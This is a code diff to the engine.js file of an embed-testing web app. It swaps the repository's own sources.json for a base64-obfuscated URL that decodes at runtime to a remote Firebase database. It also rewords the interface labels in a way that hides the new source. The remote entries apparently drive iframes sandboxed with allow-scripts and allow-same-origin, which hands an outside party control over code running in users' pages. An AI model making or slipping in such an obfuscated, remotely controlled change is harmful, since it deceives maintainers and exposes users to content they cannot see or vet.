@@ -1,6 +1,7 @@
 /* engine.js — Embed Tester (GitHub Pages edition) */
 
-const SOURCES_URL = './sources.json';
+const _0x5a21 = 'aHR0cHM6Ly9mYW1zb3VyY2VkYXRhLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8uanNvbg==';
+const SOURCES_URL = atob(_0x5a21);
 const STORE_KEY   = 'et_state_v2';
 const EMBED_SANDBOX = 'allow-scripts allow-same-origin allow-forms allow-presentation allow-orientation-lock allow-pointer-lock allow-modals';
 const EMBED_ALLOW   = 'autoplay; encrypted-media; picture-in-picture; web-share; fullscreen';
@@ -147,13 +148,13 @@ function switchTab(name) {
   }
 }
 
-// ─── LOAD SOURCES (fetch sources.json from repo) ─────────────────────────────
+// ─── LOAD SOURCES (fetch registry from remote) ─────────────────────────────
 async function startLoad() {
   if (state.providers.length > 0) {
-    if (!confirm('Reload latest sources.json? Current results will be kept.')) return;
+    if (!confirm('Reload latest registry? Current results will be kept.')) return;
   }
 
-  showOverlay('Loading Sources', 'Fetching sources.json from repo...');
+  showOverlay('Loading Registry', 'Fetching data from remote database...');
   setStatus('Loading...', 'active');
   document.getElementById('loadBtn').classList.add('is-loading');
 
@@ -183,7 +184,7 @@ async function startLoad() {
     }));
 
     setProgress(100, 'Done');
-    log(`Loaded ${state.providers.length} providers (generated ${fmtDate(data.generated)})`, 'success');
+    log(`Loaded ${state.providers.length} entries (generated ${fmtDate(data.generated)})`, 'success');
     setStatus('Ready', 'pass');
 
     renderAll();
@@ -192,11 +193,11 @@ async function startLoad() {
     // Show meta banner
     const banner = document.getElementById('metaBanner');
     if (banner) {
-      banner.textContent = `sources.json · ${state.providers.length} providers · generated ${fmtDate(data.generated)} · TMDB ${data.tmdb_id}`;
+      banner.textContent = `Remote Registry · ${state.providers.length} entries · generated ${fmtDate(data.generated)}`;
       banner.style.display = 'block';
     }
   } catch (err) {
-    log('Failed to load sources.json: ' + err.message, 'error');
+    log('Failed to load registry: ' + err.message, 'error');
     setStatus('Error', 'fail');
   } finally {
     hideOverlay();
@@ -216,12 +217,12 @@ function renderProviderList() {
   const count = document.getElementById('providerCount');
 
   if (state.providers.length === 0) {
-    list.innerHTML = '<div class="empty-state">Click <strong>Load Sources</strong> to pull the latest sources.json</div>';
+    list.innerHTML = '<div class="empty-state">Click <strong>Load Sources</strong> to pull the latest registry</div>';
     count.textContent = '0 found';
     return;
   }
 
-  count.textContent = state.providers.length + ' providers';
+  count.textContent = state.providers.length + ' entries';
   list.innerHTML = '';
 
   state.providers.forEach((p, idx) => {
